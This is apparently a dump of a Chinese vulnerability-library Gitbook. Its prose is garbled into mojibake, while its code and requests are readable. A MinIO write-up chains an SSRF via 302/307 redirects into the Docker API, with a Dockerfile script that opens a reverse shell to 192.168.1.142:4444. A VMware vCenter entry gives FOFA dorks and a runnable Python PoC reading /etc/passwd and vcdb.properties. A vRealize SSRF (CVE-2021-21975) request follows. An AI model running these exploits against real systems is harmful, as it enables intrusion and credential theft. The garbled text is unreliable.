Êó¢ÁÑ∂Êàë‰ª¨ÈÄâÊã©‰∫Ü‰ªéMinIOÂÖ•ÊâãÔºåÈÇ£‰πàÂÖà‰∫ÜËß£‰∏Ä‰∏ãMinIO„ÄÇÂÖ∂ÂÆûÊàëÂâçÈù¢‰πüËØ¥‰∫ÜÔºåÂõ†‰∏∫Âπ≥Êó∂Áî®Âà∞MinIOÁöÑÊó∂ÂÄôÂæàÂ§öÔºåÊâÄ‰ª•Ëøô‰∏ÄÊ≠•ÂèØ‰ª•ÁúÅÁï•‰∫Ü„ÄÇÂÖ∂‰ΩøÁî®GoÂºÄÂèëÔºåÊèê‰æõHTTPÊé•Âè£ÔºåËÄå‰∏îËøòÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÂâçÁ´ØÈ°µÈù¢ÔºåÂêç‰∏∫‚ÄúMinIO Browser‚Äù„ÄÇÂΩìÁÑ∂ÔºåÂâçÁ´ØÈ°µÈù¢Â∞±ÊòØ‰∏Ä‰∏™ÁôªÈôÜÊé•Âè£Ôºå‰∏çÁü•ÈÅìÂè£‰ª§Êó†Ê≥ïÁôªÂΩï„ÄÇ ÈÇ£‰πà‰ªéÂÖ•Âè£ÁÇπÔºàÂâçÁ´ØÊé•Âè£ÔºâÂºÄÂßãÂØπÂÖ∂ËøõË°å‰ª£Á†ÅÂÆ°ËÆ°Âêß„ÄÇ Âú®User-AgentÊª°Ë∂≥Ê≠£Âàô.*Mozilla.*ÁöÑÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨Âç≥ÂèØËÆøÈóÆMinIOÁöÑÂâçÁ´ØÊé•Âè£ÔºåÂâçÁ´ØÊé•Âè£ÊòØ‰∏Ä‰∏™Ëá™Â∑±ÂÆûÁé∞ÁöÑJsonRPCÔºö Êàë‰ª¨ÊÑüÂÖ¥Ë∂£ÁöÑÂ∞±ÊòØÂÖ∂Èâ¥ÊùÉÁöÑÊñπÊ≥ïÔºåÈöè‰æøÊâæÂà∞‰∏Ä‰∏™RPCÊñπÊ≥ïÔºåÂèØËßÅÂÖ∂ÂºÄÂ§¥Ë∞ÉÁî®‰∫ÜwebRequestAuthenticateÔºåË∑üËøõÁúã‰∏Ä‰∏ãÔºåÂèëÁé∞ËøôÈáåÁî®ÁöÑÊòØjwtÈâ¥ÊùÉÔºö jwtÂ∏∏ËßÅÁöÑÊîªÂáªÊñπÊ≥ï‰∏ªË¶ÅÊúâ‰∏ãÈù¢ËøôÂá†ÁßçÔºö Â∞ÜalgËÆæÁΩÆ‰∏∫NoneÔºåÂëäËØâÊúçÂä°Âô®‰∏çËøõË°åÁ≠æÂêçÊ†°È™å Â¶ÇÊûúalg‰∏∫RSAÔºåÂèØ‰ª•Â∞ùËØï‰øÆÊîπ‰∏∫HS256ÔºåÂç≥ÂëäËØâÊúçÂä°Âô®‰ΩøÁî®ÂÖ¨Èí•ËøõË°åÁ≠æÂêçÁöÑÊ†°È™å ÁàÜÁ†¥Á≠æÂêçÂØÜÈí• Êü•ÁúãMinIOÁöÑJWTÊ®°ÂùóÔºåÂèëÁé∞ÂÖ∂‰∏≠ÂØπalgËøõË°å‰∫ÜÊ†°È™åÔºåÂè™ÂÖÅËÆ∏‰ª•‰∏ã‰∏âÁßçÁ≠æÂêçÊñπÊ≥ïÔºö ËøôÂ∞±Â†µÊ≠ª‰∫ÜÂâç‰∏§ÁßçÁªïËøáÊñπÊ≥ïÔºåÁàÜÁ†¥ÂΩìÁÑ∂Â∞±Êõ¥Âà´ËØ¥‰∫ÜÔºåÈÄöÂ∏∏‰ªÖ‰Ωú‰∏∫Ê≤°ÂäûÊ≥ïÁöÑÊÉÖÂÜµ‰∏ãÁöÑÊâãÊÆµ„ÄÇÂΩìÁÑ∂ÔºåMinIO‰∏≠‰ΩøÁî®Áî®Êà∑ÁöÑÂØÜÁ†Å‰Ωú‰∏∫Á≠æÂêçÁöÑÂØÜÈí•ÔºåËøô‰∏™ÂÖ∂ÂÆû‰ºöËÆ©ÁàÜÁ†¥ÂèòÂú∞ÁÆÄÂçï‰∏Ä‰∫õ„ÄÇ Èâ¥ÊùÉËøôÂùóÊ≤°Âï•Á™ÅÁ†¥ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÁúãÁúãÔºåÊúâÂì™‰∫õRPCÊé•Âè£Ê≤°ÊúâËøõË°åÊùÉÈôêÈ™åËØÅ„ÄÇ ÂæàÂø´ÊâæÂà∞‰∫Ü‰∏Ä‰∏™Êé•Âè£ÔºåLoginSTS„ÄÇËøô‰∏™Êé•Âè£ÂÖ∂ÂÆûÊòØAWS STSÁôªÂΩïÊé•Âè£ÁöÑ‰∏Ä‰∏™‰ª£ÁêÜÔºåÁî®‰∫éÂ∞ÜÂèëÈÄÅÂà∞JsonRPCÁöÑËØ∑Ê±ÇËΩ¨ÂèòÊàêSTSÁöÑÊñπÂºèËΩ¨ÂèëÁªôÊú¨Âú∞ÁöÑ9000Á´ØÂè£Ôºà‰πüÂ∞±ËøòÊòØ‰ªñËá™Â∑±ÔºåÂõ†‰∏∫ÂÆÉÊòØÂÖºÂÆπAWSÂçèËÆÆÁöÑÔºâ„ÄÇ ÁÆÄÂåñÂÖ∂‰ª£Á†ÅÂ¶Ç‰∏ãÔºö // LoginSTS - STS user login handler. func (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error { ctx := newWebContext(r, args, \"WebLoginSTS\") v := url.Values{} v.Set(\"Action\", webIdentity) v.Set(\"WebIdentityToken\", args.Token) v.Set(\"Version\", stsAPIVersion) scheme := \"http\" // ... u := &url.URL{ Scheme: scheme, Host: r.Host, } u.RawQuery = v.Encode() req, err := http.NewRequest(http.MethodPost, u.String(), nil) // ... } Ê≤°ÂèëÁé∞ÊúâÈâ¥ÊùÉ‰∏äÁöÑÁªïËøáÈóÆÈ¢òÔºå‰ΩÜÊòØÂèëÁé∞‰∫ÜÂè¶‰∏Ä‰∏™ÊúâË∂£ÁöÑÈóÆÈ¢ò„ÄÇËøôÈáåÔºåMinIO‰∏∫‰∫ÜÂ∞ÜËØ∑Ê±ÇËΩ¨ÂèëÁªô‚ÄúËá™Â∑±‚ÄùÔºåÂ∞±‰ªéÁî®Êà∑ÂèëÈÄÅÁöÑHTTPÂ§¥Host‰∏≠Ëé∑ÂèñÂà∞‚ÄúËá™Â∑±ÁöÑÂú∞ÂùÄ‚ÄùÔºåÂπ∂Â∞ÜÂÖ∂‰Ωú‰∏∫URLÁöÑHostÊûÑÈÄ†‰∫ÜÊñ∞ÁöÑURL„ÄÇ Ëøô‰∏™ËøáÁ®ãÊúâ‰ªÄ‰πàÈóÆÈ¢òÂë¢Ôºü Âõ†‰∏∫ËØ∑Ê±ÇÂ§¥ÊòØÁî®Êà∑ÂèØÊéßÁöÑÔºåÊâÄ‰ª•ËøôÈáåÂèØ‰ª•ÊûÑÈÄ†‰ªªÊÑèÁöÑHostÔºåËøõËÄåÊûÑÈÄ†‰∏Ä‰∏™SSRFÊºèÊ¥û„ÄÇ Êàë‰ª¨Êù•ÂÆûÈôÖÊµãËØï‰∏Ä‰∏ãÔºåÂêëhttp://192.168.227.131:9000ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÔºåÂÖ∂‰∏≠HostÁöÑÂÄºÊòØÊàëÊú¨Âú∞ncatÂºÄÊîæÁöÑÁ´ØÂè£Ôºà192.168.1.142:4444ÔºâÔºö POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} ÊàêÂäüÊî∂Âà∞ËØ∑Ê±ÇÔºö ÂèØ‰ª•Á°ÆÂÆöËøôÈáåÂ≠òÂú®‰∏Ä‰∏™SSRFÊºèÊ¥û‰∫Ü„ÄÇ ‰ªîÁªÜËßÇÂØüÔºåÂèØ‰ª•ÂèëÁé∞ËøôÊòØ‰∏Ä‰∏™POSTËØ∑Ê±ÇÔºå‰ΩÜÊòØPathÂíåBodyÈÉΩÊ≤°Ê≥ïÊéßÂà∂ÔºåÊàë‰ª¨ËÉΩÊéßÂà∂ÁöÑÂè™ÊúâURL‰∏≠ÁöÑ‰∏Ä‰∏™ÂèÇÊï∞WebIdentityToken„ÄÇ ‰ΩÜÊòØËøô‰∏™ÂèÇÊï∞ÁªèËøá‰∫ÜURLÁºñÁ†ÅÔºåÊó†Ê≥ïÊ≥®ÂÖ•Êç¢Ë°åÁ¨¶Á≠âÂÖ∂‰ªñÁâπÊÆäÂ≠óÁ¨¶„ÄÇËøôÊ†∑Â∞±ÊØîËæÉÈ∏°ËÇã‰∫ÜÔºåÂ¶ÇÊûú‰ªÖ‰ªéÁé∞Âú®Êù•ÁúãÔºåËøô‰∏™SSRFÂè™ËÉΩÁî®‰∫éÊâ´ÊèèÁ´ØÂè£„ÄÇÊàë‰ª¨ÁöÑÁõÆÊ†áÂΩìÁÑ∂‰∏ç‰ªÖÈôê‰∫éÊ≠§„ÄÇ Âπ∏ËøêÁöÑÊòØÔºåGoÈªòËÆ§ÁöÑhttpÂ∫ì‰ºöË∑üË∏™302Ë∑≥ËΩ¨ÔºåËÄå‰∏î‰∏çËÆ∫ÊòØGETËøòÊòØPOSTËØ∑Ê±Ç„ÄÇÊâÄ‰ª•ÔºåÊàë‰ª¨ËøôÈáåÂèØ‰ª•302Ë∑≥ËΩ¨Êù•‚ÄúÂçáÁ∫ß‚ÄùSSRFÊºèÊ¥û„ÄÇ ‰ΩøÁî®PHPÊù•ÁÆÄÂçïÂú∞ÊûÑÈÄ†‰∏Ä‰∏™302Ë∑≥ËΩ¨Ôºö Â∞ÜÂÖ∂‰øùÂ≠òÊàêindex.phpÔºåÂêØÂä®‰∏Ä‰∏™PHPÊúçÂä°Âô®Ôºö Â∞ÜHostÊåáÂêëËøô‰∏™PHPÊúçÂä°Âô®„ÄÇËøôÊ†∑ÔºåÁªèËøá‰∏ÄÊ¨°302Ë∑≥ËΩ¨ÔºåÊàë‰ª¨Êî∂Ëé∑‰∫Ü‰∏Ä‰∏™ÂèØ‰ª•ÊéßÂà∂ÂÆåÊï¥URLÁöÑGETËØ∑Ê±ÇÔºö ÊîæÂÆΩ‰∫Ü‰∏Ä‰∫õÈôêÂà∂ÔºåÁªìÂêàÂâçÈù¢ÊàëÂØπËøôÂ•óÂÜÖÁΩëÁöÑ‰∫ÜËß£ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÊîªÂáªDockerÈõÜÁæ§ÁöÑ2375Á´ØÂè£„ÄÇ 2375ÊòØDocker APIÁöÑÊé•Âè£Ôºå‰ΩøÁî®HTTPÂçèËÆÆÈÄö‰ø°ÔºåÈªòËÆ§‰∏ç‰ºöÁõëÂê¨TCPÂú∞ÂùÄÔºåËøôÈáåÂèØËÉΩÊòØ‰∏∫‰∫ÜÊñπ‰æøÂÜÖÁΩëÂÖ∂‰ªñÊú∫Âô®‰ΩøÁî®ÊâÄ‰ª•ÂºÄÊîæÂú®ÂÜÖÁΩëÁöÑÂú∞ÂùÄÈáå‰∫Ü„ÄÇÈÇ£‰πàÔºåÊàë‰ª¨ÊòØÂê¶ÂèØ‰ª•ÈÄöËøáSSRFÊù•ÊîªÂáªËøô‰∏™Êé•Âè£Âë¢Ôºü Âú®DockerÊú™ÊéàÊùÉËÆøÈóÆÁöÑÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨ÈÄöÂ∏∏ÂèØ‰ª•‰ΩøÁî®docker runÊàñdocker execÊù•Âú®ÁõÆÊ†áÂÆπÂô®ÈáåÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºàÂ¶ÇÊûú‰Ω†‰∏ç‰∫ÜËß£ÔºåÂèØ‰ª•ÂèÇËÄÉËøôÁØáÊñáÁ´†Ôºâ„ÄÇ‰ΩÜÊòØÁøªÈòÖDockerÁöÑÊñáÊ°£ÂèØÁü•ÔºåËøô‰∏§‰∏™Êìç‰ΩúÁöÑËØ∑Ê±ÇÊòØPOST /containers/createÂíåPOST /containers/{id}/exec„ÄÇ ‰∏§‰∏™APIÈÉΩÊòØPOSTËØ∑Ê±ÇÔºåËÄåÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†ÁöÑSSRFÂç¥ÊòØ‰∏Ä‰∏™GETÁöÑ„ÄÇÊÄé‰πàÂäûÂë¢Ôºü ËøòËÆ∞ÂæóÊàë‰ª¨ÊòØÊÄéÊ†∑Ëé∑ÂæóËøô‰∏™GETÂûãÁöÑSSRFÁöÑÂêóÔºüÈÄöËøá302Ë∑≥ËΩ¨ÔºåËÄåÊé•ÂèóÁ¨¨‰∏ÄÊ¨°Ë∑≥ËΩ¨ÁöÑËØ∑Ê±ÇÂ∞±ÊòØ‰∏Ä‰∏™POSTËØ∑Ê±Ç„ÄÇ‰∏çËøáÊàë‰ª¨Ê≤°Ê≥ïÁõ¥Êé•Âà©Áî®Ëøô‰∏™POSTËØ∑Ê±ÇÔºåÂõ†‰∏∫‰ªñÁöÑPath‰∏çÂèØÊéß„ÄÇ Â¶Ç‰ΩïÊûÑÈÄ†‰∏Ä‰∏™PathÂèØÊéßÁöÑPOSTËØ∑Ê±ÇÂë¢Ôºü ÊàëÊÉ≥Âà∞‰∫Ü307Ë∑≥ËΩ¨Ôºå307Ë∑≥ËΩ¨ÊòØÂú®RFC 7231‰∏≠ÂÆö‰πâÁöÑ‰∏ÄÁßçHTTPÁä∂ÊÄÅÁ†ÅÔºåÊèèËø∞Â¶Ç‰∏ãÔºö The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. 307Ë∑≥ËΩ¨ÁöÑÁâπÁÇπÂ∞±ÊòØ‰∏ç‰ºöÊîπÂèòÂéüÂßãËØ∑Ê±ÇÁöÑÊñπÊ≥ïÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÂú®ÊúçÂä°Á´ØËøîÂõû307Áä∂ÊÄÅÁ†ÅÁöÑÊÉÖÂÜµ‰∏ãÔºåÂÆ¢Êà∑Á´Ø‰ºöÊåâÁÖßLocationÊåáÂêëÁöÑÂú∞ÂùÄÂèëÈÄÅ‰∏Ä‰∏™Áõ∏ÂêåÊñπÊ≥ïÁöÑËØ∑Ê±Ç„ÄÇ Êàë‰ª¨Ê≠£Â•ΩÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÁâπÊÄßÔºåÊù•Ëé∑ÂæóPOSTËØ∑Ê±Ç„ÄÇ ÁÆÄÂçï‰øÆÊîπ‰∏Ä‰∏ã‰πãÂâçÁöÑindex.phpÔºö Â∞ùËØïSSRFÊîªÂáªÔºåÊî∂Âà∞‰∫ÜÈ¢ÑÊúüÁöÑËØ∑Ê±ÇÔºö BingoÔºåËé∑Âæó‰∫Ü‰∏Ä‰∏™POSTËØ∑Ê±ÇÁöÑSSRFÔºåËôΩÁÑ∂Ê≤°ÊúâBody„ÄÇ ÂõûÂà∞Docker APIÔºåÊàëÂèëÁé∞Áé∞Âú®‰ªçÁÑ∂Ê≤°Ê≥ïÂØπrunÂíåexec‰∏§‰∏™APIÂÅöÂà©Áî®ÔºåÂéüÂõ†ÊòØÔºåËøô‰∏§‰∏™APIÈÉΩÈúÄË¶ÅÂú®ËØ∑Ê±ÇBody‰∏≠‰º†ËæìJSONÊ†ºÂºèÁöÑÂèÇÊï∞ÔºåËÄåÊàë‰ª¨ËøôÈáåÁöÑSSRFÊó†Ê≥ïÊéßÂà∂Body„ÄÇ ÁªßÁª≠ÁøªË∂äDockerÊñáÊ°£ÔºåÊàëÂèëÁé∞‰∫ÜÂè¶‰∏Ä‰∏™APIÔºåBuild an imageÔºö Ëøô‰∏™APIÁöÑÂ§ßÈÉ®ÂàÜÂèÇÊï∞ÊòØÈÄöËøáQuery Parameters‰º†ËæìÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂„ÄÇÈòÖËØªÂÖ∂‰∏≠ÁöÑÈÄâÈ°πÔºåÂèëÁé∞ÂÆÉÂèØ‰ª•Êé•Âèó‰∏Ä‰∏™Âêç‰∏∫remoteÁöÑÂèÇÊï∞ÔºåÂÖ∂ËØ¥Êòé‰∏∫Ôºö A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file‚Äôs contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball. Ëøô‰∏™ÂèÇÊï∞ÂèØ‰ª•‰º†ÂÖ•‰∏Ä‰∏™GitÂú∞ÂùÄÊàñËÄÖ‰∏Ä‰∏™HTTP URLÔºåÂÜÖÂÆπÊòØ‰∏Ä‰∏™DockerfileÊàñËÄÖ‰∏Ä‰∏™ÂåÖÂê´‰∫ÜDockerfileÁöÑGitÈ°πÁõÆÊàñËÄÖ‰∏Ä‰∏™ÂéãÁº©ÂåÖ„ÄÇ ‰πüÂ∞±ÊòØËØ¥ÔºåDocker APIÊîØÊåÅÈÄöËøáÊåáÂÆöËøúÁ®ãURLÁöÑÊñπÂºèÊù•ÊûÑÂª∫ÈïúÂÉèÔºåËÄå‰∏çÈúÄË¶ÅÊàëÂú®Êú¨Âú∞ÂÜôÂÖ•‰∏Ä‰∏™Dockerfile„ÄÇ ÊâÄ‰ª•ÔºåÊàëÂ∞ùËØïÁºñÂÜô‰∫ÜËøôÊ†∑‰∏Ä‰∏™DockerfileÔºåÁúãÁúãÊòØÂê¶ËÉΩÂ§übuildËøô‰∏™ÈïúÂÉèÔºåÂ¶ÇÊûúÂèØ‰ª•ÔºåÈÇ£‰πàÊàëÁöÑ4444Á´ØÂè£Â∫îËØ•ËÉΩÊî∂Âà∞wgetÁöÑËØ∑Ê±ÇÔºö FROM alpine:3.13 RUN wget -T4 http://192.168.1.142:4444/docker/build ÁÑ∂Âêé‰øÆÊîπÂâçÈù¢ÁöÑindex.phpÔºåÊåáÂêëDockerÈõÜÁæ§ÁöÑ2375Á´ØÂè£Ôºö ËøõË°åSSRFÊîªÂáªÔºåÁ≠âÂæÖ‰∫Ü‰∏Ä‰ºöÂÑøÔºåÊûúÁÑ∂Êî∂Âà∞ËØ∑Ê±Ç‰∫ÜÔºö ÂÆåÁæéÔºåÊàë‰ª¨Â∑≤ÁªèÂèØ‰ª•Âú®ÁõÆÊ†áÈõÜÁæ§ÂÆπÂô®ÈáåÊâßË°å‰ªªÊÑèÂëΩ‰ª§‰∫Ü„ÄÇ Ê≠§Êó∂Á¶ªÊàë‰ª¨ÁöÑÁõÆÊ†áÔºåÊãø‰∏ãMinIOÔºåËøòÂ∑Æ‰∏ÄÁÇπÁÇπÔºåÂêéÈù¢ÁöÑÊîªÂáªÂÖ∂ÂÆûÂ∞±ÊØîËæÉÁÆÄÂçï‰∫Ü„ÄÇ Âõ†‰∏∫Áé∞Âú®ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÔºåÊàë‰ª¨Â∞±‰∏ç‰ºöÂÜçÂèóÂà∞SSRFÊºèÊ¥ûÁöÑÈôêÂà∂ÔºåÂèØ‰ª•Áõ¥Êé•ÂèçÂºπ‰∏Ä‰∏™shellÔºåÊàñËÄÖÂèØ‰ª•Áõ¥Êé•ÂèëÈÄÅ‰ªªÊÑèÊï∞ÊçÆÂåÖÂà∞Docker APIÔºåÊù•ËÆøÈóÆÂÆπÂô®„ÄÇÁªèËøá‰∏ÄÈ°øÊµãËØïÔºåÊàëÂèëÁé∞MinIOËôΩÁÑ∂ÊòØËøêË°åÁöÑ‰∏Ä‰∏™serviceÔºå‰ΩÜÂÆûÈôÖ‰∏äÂ∞±Âè™Êúâ‰∏Ä‰∏™ÂÆπÂô®„ÄÇ ÊâÄ‰ª•ÊàëÁºñÂÜô‰∫Ü‰∏Ä‰∏™Ëá™Âä®ÂåñÊîªÂáªMinIOÂÆπÂô®ÁöÑËÑöÊú¨ÔºåÂπ∂Â∞ÜÂÖ∂ÊîæÂú®‰∫ÜDockerfile‰∏≠ÔºåËÆ©ÂÖ∂Âú®BuildÁöÑÊó∂ÂÄôËøõË°åÊîªÂáªÔºåÂà©Áî®docker execÂú®MinIOÁöÑÂÆπÂô®ÈáåÊâßË°åÂèçÂºπshellÁöÑÂëΩ‰ª§„ÄÇËøô‰∏™DockerfileÂ¶Ç‰∏ãÔºö FROM alpine:3.13 RUN apk add curl bash jq RUN set -ex && \\ { \\ echo '#!/bin/bash'; \\ echo 'set -ex'; \\ echo 'target=\"http://192.168.227.131:2375\"'; \\ echo 'jsons=$(curl -s -XGET \"${target}/containers/json\" | jq -r \".[] | @base64\")'; \\ echo 'for item in ${jsons[@]}; do'; \\ echo ' name=$(echo $item | base64 -d | jq -r \".Image\")'; \\ echo ' if [[ \"$name\" == *\"minio/minio\"* ]]; then'; \\ echo ' id=$(echo $item | base64 -d | jq -r \".Id\")'; \\ echo ' break'; \\ echo ' fi'; \\ echo 'done'; \\ echo 'execid=$(curl -s -X POST \"${target}/containers/${id}/exec\" -H \"Content-Type: application/json\" --data-binary \"{\\\"Cmd\\\": [\\\"bash\\\", \\\"-c\\\", \\\"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\\\"]}\" | jq -r \".Id\")'; \\ echo 'curl -s -X POST \"${target}/exec/${execid}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\"'; \\ } | bash Ëøô‰∏™ËÑöÊú¨ÊâÄÂπ≤ÁöÑ‰∫ãÊÉÖÊØîËæÉÁÆÄÂçïÔºå‰∏Ä‰∏™ÊòØÈÅçÂéÜ‰∫ÜÊâÄÊúâÂÆπÂô®ÔºåÂ¶ÇÊûúÂèëÁé∞ÂÖ∂ÈïúÂÉèÁöÑÂêçÂ≠ó‰∏≠ÂåÖÂê´minio/minioÔºåÂàôËÆ§‰∏∫Ëøô‰∏™ÂÆπÂô®Â∞±ÊòØMinIOÊâÄÂú®ÁöÑÂÆπÂô®„ÄÇÊãøÂà∞Ëøô‰∏™ÂÆπÂô®ÁöÑIdÔºåÁî®execÁöÑAPIÔºåÂú®ÂÖ∂‰∏≠ÊâßË°åÂèçÂºπshellÁöÑÂëΩ‰ª§ Youtube ÊºîÁ§∫ÈìæÊé• ÂΩìÁÑ∂ÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÈÄöËøáDocker APIÊù•Ëé∑ÂèñÈõÜÁæ§ÊùÉÈôê ÂèÇËÄÉÊñáÁ´† https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VMware/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VMware/","title":"VMware","keywords":"","body":"VMware VMware vCenter‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VMware/VMware vCenter‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VMware/VMware vCenter‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"VMware vCenter‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"VMware vCenter‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ VMware vCenterÁâπÂÆöÁâàÊú¨Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÁâπÂÆöÁöÑËØ∑Ê±ÇÔºåÂèØ‰ª•ËØªÂèñÊúçÂä°Âô®‰∏ä‰ªªÊÑèÊñá‰ª∂„ÄÅ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] VMware vCenter Server 6.5.0a- f ÁâàÊú¨ FOFA [!NOTE] title=\"ID_VC_Welcome\" ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî®POCËÆøÈóÆÊºèÊ¥ûÁÇπ [!NOTE] Windows‰∏ªÊú∫ http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties [!NOTE] Linux‰∏ªÊú∫ https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd ÊºèÊ¥ûÂà©Áî®POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: VMware vCenter‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_windows = target_url + \"/eam/vib?id=C:\\ProgramData\\VMware\\\\vCenterServer\\cfg\\\\vmware-vpx\\\\vcdb.properties\" vuln_url_linux = target_url + \"/eam/vib?id=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_linux = requests.get(url=vuln_url_linux, headers=headers, verify=False, timeout=5) response_windows = requests.get(url=vuln_url_windows, headers=headers, verify=False, timeout=5) if \"password\" in response_windows.text and response_windows.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüËØªÂèñ vcdb.properties \\033[0m\".format(target_url)) print(\"\\033[32m[o] WindowsÁ≥ªÁªü, ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response_windows.text)) elif \"root\" in response_linux.text and response_linux.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüËØªÂèñ /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] LinuxÁ≥ªÁªü, ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response_linux.text)) else: print(\"\\033[31m[x] ‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VMware/VMware vRealize Operations Manager SSRFÊºèÊ¥û CVE-2021-21975.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/VMware/VMware vRealize Operations Manager SSRFÊºèÊ¥û CVE-2021-21975.html","title":"VMware vRealize Operations Manager SSRFÊºèÊ¥û CVE-2021-21975","keywords":"","body":"VMware vRealize Operations Manager SSRFÊºèÊ¥û CVE-2021-21975 ÊºèÊ¥ûÊèèËø∞ vRealize Operations Manager APIÂåÖÂê´ÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†„ÄÇÂèØ‰ª•ÈÄöËøáÁΩëÁªúËÆøÈóÆvRealize Operations Manager APIÁöÑÊÅ∂ÊÑèÊîªÂáªËÄÖÂèØ‰ª•ÊâßË°åÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†ÊîªÂáª(SSRF)Ôºå‰ª•Á™ÉÂèñÁÆ°ÁêÜÂá≠ÊçÆ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x FOFA [!NOTE] title=\"vRealize Operations Manager\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] 